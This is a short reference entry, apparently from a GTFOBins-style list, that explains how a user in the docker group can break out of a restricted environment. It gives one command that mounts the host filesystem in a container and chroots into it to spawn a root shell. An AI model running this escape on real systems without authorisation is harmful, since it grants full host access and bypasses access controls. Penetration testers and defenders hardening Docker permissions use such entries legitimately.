
If the user is privilege enough to run `docker`, i.e. being in the `docker` group, it can be used to break out from restricted environments by spawning an interactive system shell.

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```